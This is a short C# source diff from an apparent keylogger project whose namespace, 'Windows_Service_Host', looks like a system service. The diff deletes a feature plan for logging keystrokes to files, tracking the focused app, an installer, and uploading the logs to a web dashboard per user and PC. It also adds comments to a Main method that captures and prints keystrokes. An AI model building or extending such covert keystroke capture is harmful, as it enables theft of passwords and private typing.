@@ -14,24 +14,11 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.Diagnostics;
 
-/* Features to add
- * 1. Writing to text file
- * 2. Being able to tell which app is in focus
- * 3. Separating Reports by Date and Hour
- * 4. Creating the web app (login page, registration page, PC page, organize reports by date, database)
- * 5. Creating an installer
- * 6. Sending the .txt files to the correct user account and PC
- */
-
 namespace Windows_Service_Host
 {
     class Keylogger
     {
-        private static void Loop()
-        {
-            
-        }
-
+        // getMonth takes an int between 1 and 12 and returns the string corresponding to the correct month.
         public static string getMonth(int month)
         {
             string strMonth = "Unknown";
@@ -76,6 +63,9 @@ namespace Windows_Service_Host
             }
             return strMonth;
         }
+
+        // The main method displays the date and outputs any keystrokes typed while the program is opened.
+        // side effects: console output
         static void Main(string[] args)
         {
             using (var api = new KeystrokeAPI())
